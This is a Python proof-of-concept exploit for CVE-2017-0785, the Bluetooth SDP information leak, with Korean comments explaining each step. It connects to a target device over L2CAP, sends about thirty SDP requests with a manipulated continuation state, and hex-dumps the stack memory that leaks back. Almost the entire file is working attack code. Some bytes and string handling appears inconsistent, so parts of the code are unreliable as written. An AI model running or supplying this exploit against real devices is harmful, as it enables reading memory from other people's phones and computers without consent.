from pwn import *   # pwntools 라이브러리 사용
import bluetooth

def print_hexdump(buffer, start_offset=0):
    print('-' * 79)
 
    offset = 0
    while offset < len(buffer):
        # Offset
        print(' %08X : ' % (offset + start_offset), end='')
 
        if ((len(buffer) - offset) < 0x10) is True:
            data = buffer[offset:]
        else:
            data = buffer[offset:offset + 0x10]
 
        # Hex Dump
        for hex_dump in data:
            print("%02X" % hex_dump, end=' ')
 
        if ((len(buffer) - offset) < 0x10) is True:
            print(' ' * (3 * (0x10 - len(data))), end='')
 
        print('  ', end='')
 
        # Ascii
        for ascii_dump in data:
            if ((ascii_dump >= 0x20) is True) and ((ascii_dump <= 0x7E) is True):
                print(chr(ascii_dump), end='')
            else:
                print('.', end='')
 
        offset = offset + len(data)
        print('')
 
    print('-' * 79)


if not 'TARGET' in args:
    log.info("Usage: CVE-2017-0785.py TARGET=XX:XX:XX:XX:XX:XX")
    exit()

target = args['TARGET']
service_long = 0x0100
service_short = 0x0001
mtu = 50            # MTU 50 byte 설정
n = 30              # 최대 전송 횟수

def packet(service, continuation_state):    # Exploit 패킷 설정
    pkt = '\x02\x00\x00'
    pkt += p16(7 + len(continuation_state)).decode('utf-8') # SDP 프로토콜의 continuation_state 조작 부분
    pkt += '\x35\x03\x19'
    pkt += p16(service).decode('utf-8')                     # service_long or service_short
    pkt += '\x01\x00'
    pkt += continuation_state
    return pkt

p = log.progress('Exploit')
p.status('Creating L2CAP socket')

sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)   # L2CAP 소켓 설정
bluetooth.set_l2cap_mtu(sock, mtu)
context.endian = 'big'                      # Big Endian 방식으로 처리

p.status('Connecting to target')
sock.connect((target, 1))

p.status('Sending packet 0')                # 0번 패킷 전송
sock.send(packet(service_long, '\x00'))     # continuation_state = 0 패킷
data = sock.recv(mtu)


if data[-3] != '\x02':                      # 마지막에 `\x02` 확인
    log.error('Invalid continuation state received.')

stack = ''

for i in range(1, n):                       # 1 ~ 30번 패킷 전송
    p.status('Sending packet %d' % i)
    sock.send(packet(service_short, data[-3:].decode('utf-8')))     # continuation_state 조작 패킷
    data = sock.recv(mtu)
    stack += data[9:-3].decode('utf-8')

sock.close()

p.success('Done')

print_hexdump(stack)                        # 스택 Memory Leak